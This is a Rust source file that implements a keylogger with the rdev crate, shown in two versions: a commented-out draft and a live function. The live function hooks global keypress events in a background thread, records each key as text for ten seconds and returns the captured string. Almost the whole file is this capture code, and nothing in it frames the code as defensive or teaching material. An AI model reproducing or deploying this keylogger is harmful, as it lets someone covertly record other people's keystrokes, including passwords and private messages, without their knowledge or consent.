/*
use rdev::{listen, Event};

fn callback(event: Event) {
    println!("{:?}", event);
}

pub fn run() -> Result<String, &'static str> {
    //if let Err(e) = listen(callback) {
      //  eprintln!("Error: {:?}", e);
    //}

    match listen(callback) {
        Ok(text) => {return Ok(text);}
        Err(_) => {return Err("keylogger error");}
    }
}
*/
use rdev::{listen, Event, EventType, Key};
use std::sync::{Arc, Mutex};
use std::thread;

pub fn run() -> Result<String, &'static str> {
    let log = Arc::new(Mutex::new(String::new()));
    let log_clone = Arc::clone(&log);

    thread::spawn(move || {
        let callback = move |event: Event| {
            if let EventType::KeyPress(key) = event.event_type {
                let mut log = log_clone.lock().unwrap();
                match key {
                    Key::KeyA => log.push('a'),
                    Key::KeyB => log.push('b'),
                    Key::KeyC => log.push('c'),
                    Key::KeyD => log.push('d'),
                    Key::KeyE => log.push('e'),
                    Key::KeyF => log.push('f'),
                    Key::KeyG => log.push('g'),
                    Key::KeyH => log.push('h'),
                    Key::KeyI => log.push('i'),
                    Key::KeyJ => log.push('j'),
                    Key::KeyK => log.push('k'),
                    Key::KeyL => log.push('l'),
                    Key::KeyM => log.push('m'),
                    Key::KeyN => log.push('n'),
                    Key::KeyO => log.push('o'),
                    Key::KeyP => log.push('p'),
                    Key::KeyQ => log.push('q'),
                    Key::KeyR => log.push('r'),
                    Key::KeyS => log.push('s'),
                    Key::KeyT => log.push('t'),
                    Key::KeyU => log.push('u'),
                    Key::KeyV => log.push('v'),
                    Key::KeyW => log.push('w'),
                    Key::KeyX => log.push('x'),
                    Key::KeyY => log.push('y'),
                    Key::KeyZ => log.push('z'),
                    Key::Num1 => log.push('1'),
                    Key::Num2 => log.push('2'),
                    Key::Num3 => log.push('3'),
                    Key::Num4 => log.push('4'),
                    Key::Num5 => log.push('5'),
                    Key::Num6 => log.push('6'),
                    Key::Num7 => log.push('7'),
                    Key::Num8 => log.push('8'),
                    Key::Num9 => log.push('9'),
                    Key::Num0 => log.push('0'),
                    Key::Space => log.push(' '),
                    Key::Return => log.push('\n'),
                    Key::Backspace => log.push_str("<BACKSPACE>"),
                    Key::Tab => log.push_str("<TAB>"),
                    Key::Escape => log.push_str("<ESC>"),
                    _ => log.push_str(&format!("<{:?}>", key)),
                }
            }
        };

        if let Err(e) = listen(callback) {
            eprintln!("Error: {:?}", e);
        }
    });

    // Let the keylogger run for a short time (e.g., 5 seconds for demo)
    std::thread::sleep(std::time::Duration::from_secs(10));

    // Return the captured string
    let captured = {
        let log = log.lock().unwrap();
        log.clone()
    };

    println!("Captured keys: {captured}");
    Ok(captured)
}
